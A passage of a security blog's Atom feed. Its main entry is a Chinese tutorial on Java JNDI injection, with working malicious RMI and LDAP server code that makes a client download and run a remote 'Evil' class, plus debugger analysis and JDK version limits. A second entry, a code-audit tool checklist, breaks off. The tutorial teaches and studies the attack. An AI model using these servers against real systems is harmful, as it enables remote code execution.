<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kpa1on&#39;s Blog</title>
  
  <subtitle>keep passion！</subtitle>
  <link href="https://kpa1on.github.io/atom.xml" rel="self"/>
  
  <link href="https://kpa1on.github.io/"/>
  <updated>2022-06-17T15:16:24.307Z</updated>
  <id>https://kpa1on.github.io/</id>
  
  <author>
    <name>kpa1on</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全之JNDI注入</title>
    <link href="https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2022-06-17T02:41:38.000Z</published>
    <updated>2022-06-17T15:16:24.307Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>JNDI注入是反序列化漏洞常用的攻击手法之一。</p><span id="more"></span><h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。</p><p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作，还可以通过（LDAP）。再提一下RMI：</p><blockquote><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。相当于利用RMI去动态加载类，RMI服务那里绑定了一个对象，然后通过<code>JNDI</code> 去获取RMI对应的绑定的那个对象。</p></blockquote><p>通过得到的RMI服务端那里的对象，然后调用方法，实际上是在RMI服务那边执行的，也就是说这样攻击的是服务端，那如何攻击客户端呢。</p><blockquote><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p></blockquote><p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，得到的是一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <a href="http://ip:port/refClassName.class">http://ip:port/refClassName.class</a> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数、静态代码块、getObjectInstance()等。这些地方都可以写入恶意代码。而且这个调用是在客户端，而不是在服务端。这就实现了客户端的命令执行。</p><h3 id="JNDI-RMI代码测试"><a href="#JNDI-RMI代码测试" class="headerlink" title="JNDI+RMI代码测试"></a>JNDI+RMI代码测试</h3><p>客户端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://42.194.149.25:8111/test&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;42.194.149.25&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8111</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">feng</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;http://42.194.149.25:8112/&quot;</span>);<span class="comment">//构造出一个Reference对象,第一个className用处不大，第二个参数factory是用来指定类名的，第三个参数就是当CLASSPATH找不到指定的类的时候，去搜索的远程URL路径了。也就是查找http://42.194.149.25:8112/Evil.class</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(feng);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写一个<code>Evil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>Evil.java</code>编译好</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617141531834-1579649378.png" alt="image-20220617141530737"></p><p>运行客户端代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617163834494-1141739286.png" alt="image-20220617163834298"></p><p>这里弄了很久，之前运行一直显示timeout，后面调试发现，在rmi通信的时候是启用了一个随机端口比如44567，vps因为有安全组所以一直连不上，把安全组策略打开即可。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164110192-943870745.png" alt="image-20220617164109795"></p><h3 id="JNDI-RMI调试分析"><a href="#JNDI-RMI调试分析" class="headerlink" title="JNDI+RMI调试分析"></a>JNDI+RMI调试分析</h3><p>在lookup函数处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164309402-241499107.png" alt="image-20220617164309349"></p><p>跟进rmiURLContext#lookup</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164322491-1242926316.png" alt="image-20220617164322361"></p><p>通过rmiURLContext#getRootURLContext拿到var2，var2如下，里面把包括远程主机和对应的端口，以及绑定对象的名字</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164753272-151728509.png" alt="image-20220617164753147"></p><p>继续跟进var3#lookup</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165035151-1967729845.png" alt="image-20220617165035321"></p><p>通过this.registry#lookup方法拿到RMI绑定的对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165354472-424846252.png" alt="image-20220617165354526"></p><p>向下，跟进decodeObject()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165531472-280695840.png" alt="image-20220617165531724"></p><p>这里先判断var1是否是<code>ReferenceWrapper</code>类的对象，它<code>implements RemoteReference</code>了，所以会调用<code>getReference()</code>，获取<code>Reference</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172709689-478528339.png" alt="image-20220617172709570"></p><p>进入<code>NamingManager.getObjectInstance</code>，前面通过一些if语句的判断，重点是下面这几行代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172958332-1022715033.png" alt="image-20220617172958249"></p><p>跟进getObjectFactoryFromReference()函数，<code>clas = helper.loadClass(factoryName);</code>这里是本地类加载，因为找不到<code>Evil</code>类所以会加载失败。继续往下在<code>codebase = ref.getFactoryClassLocation()</code>中，<code>FactoryClassLocation</code>就是我们请求的URL，并赋值给<code>codebase</code>，下面就通过<code>URLClassLoader</code>远程加载类，跟进loadClass()方法，获取<code>URLClassLoader</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174419754-846853933.png" alt="image-20220617174420127"></p><p>再跟进loadClass()方法，可以看到这里用<code>Class.forName</code>加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174351473-1380822828.png" alt="image-20220617174351661"></p><p>成功加载到了clas后，再return (clas !&#x3D; null) ? (ObjectFactory) clas.newInstance() : null;，调用它的newInstance()进行实例化，从而调用了无参构造器，执行了无参构造器里面的代码，因此可以将恶意代码放入无参构造器中。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617173457303-1784389861.png" alt="image-20220617173457054"></p><p>回到getObjectFactoryFromReference()调用处，继续往下，可以发现还会调用getObjectInstance()方法，因此也可以把代码写到<code>getObjectInstance</code>方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617175505587-983781106.png" alt="image-20220617175505727"></p><p>调用链大致如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182136384-338384993.png" alt="image-20220617182136524"></p><p>JNDI注入利用RMI的话，版本会受到极大的限制。</p><h3 id="JNDI-LDAP代码测试"><a href="#JNDI-LDAP代码测试" class="headerlink" title="JNDI+LDAP代码测试"></a>JNDI+LDAP代码测试</h3><p>LDAP是轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p><p>因为RMI会受到限制，所以就有了JNDI+LDAP的注入方式。</p><blockquote><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p></blockquote><p>服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8112/#Evil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8111</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:8111/Evil&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617223744211-553424588.png" alt="image-20220617223742062"></p><h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="RMI版本限制"><a href="#RMI版本限制" class="headerlink" title="RMI版本限制"></a>RMI版本限制</h4><p>这里还需要说下在 当RMI客户端引用远程对象将受本地Java环境限制，即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p><p>所以这里如果我们进行利用的话，客户端的RMI启动的时候就需要设置useCodebaseOnly</p><p>java在6u45、7u21开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p><p>在javasec中看到说是8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617180421366-1985012742.png" alt="image-20220617180420743"></p><p>除此之外被引用的ObjectFactory对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p><p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p><p>如果想要通过rmi的jndi进行加载恶意类，在jdk8中，版本就可以适用到113</p><p>JDK 6u141 <a href="http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141">http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a><br>JDK 7u131 <a href="http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html">http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a><br>JDK 8u121 <a href="http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html">http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></p><p>如下为jdk8u321的测试结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182734589-490760347.png" alt="image-20220617182734089"></p><h4 id="LDAP版本限制"><a href="#LDAP版本限制" class="headerlink" title="LDAP版本限制"></a>LDAP版本限制</h4><p>然后再说下ldap的jndi，ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false。</p><p>这里就是为什么进行JNDI注入的时候用LDAP会通用，因为我们如果想要通过ldap的jndi进行加载恶意类，在jdk8中，版本就可以适用到8u191</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617181311638-1405806032.png" alt="image-20220617181311507"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/rfrder/article/details/120048519">https://blog.csdn.net/rfrder/article/details/120048519</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;JNDI注入是反序列化漏洞常用的攻击手法之一。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="https://kpa1on.github.io/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb代码审计CheckList</title>
    <link href="https://kpa1on.github.io/2022/06/16/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList/"/>
    <id>https://kpa1on.github.io/2022/06/16/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList/</id>
    <published>2022-06-16T15:30:37.000Z</published>
    <updated>2022-06-17T02:23:59.266Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>整理下平时Java代码审计中常见的一些漏洞学习总结以及一些审计思路，后续会不断补充。</p><span id="more"></span><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>以下为常用的工具清单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">一、代码编辑器：</span><br><span class="line">1.Jetbrains IDEA(IDE)</span><br><span class="line">2.Sublime text(文本编辑器)</span><br><span class="line">3.Eclipse</span><br><span class="line">二、测试工具：</span><br><span class="line">1.Burp Suite：是渗透测试工作者必备的一款工具，同时对于代码审计者和安全研究人员来说，这也是一款比较重要的测试工具，其跨平台、便捷、强大的功能以及丰富的插件，深受信息安全从业者的喜爱。</span><br><span class="line">2.SwitchyOmega：SwitchyOmega 是一款代理管理插件，支持Firefox和Chrome浏览器，并支持HTTP、HTTPS、socket4和socket5协议。</span><br><span class="line">3.Max HackerBar：HackBar是Firefox的一个插件，也是信息安全从业者常用的经典工具。</span><br><span class="line">4.Postman：Postman是一款功能强大的网页调试工具，能够为用户提供强大的Web API &amp; HTTP请求调试功能。</span><br><span class="line">5.Ysoserial：是一款开源的Java反序列化测试工具，内部集成有多种利用链，可以快速生成用于攻击的代码，也可以将新公开的反序列化漏洞利用方式自行加入Ysoserial中。</span><br><span class="line">6.Marshalsec：是一款开源的Java反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动恶意的RMI服务等。</span><br><span class="line">7.MySQL Monitor：是Web版本的SQL记录实时监控工具。</span><br><span class="line">8.Beyond Compare：是一款文件比较工具，主要对比两个文件夹或者文件，并以颜色标示差异，比较范围包括目录、文档内容等。使用该工具可以方便代码审计人员快速地比对两个版本代码的差别。</span><br><span class="line">三、反编译工具</span><br><span class="line">    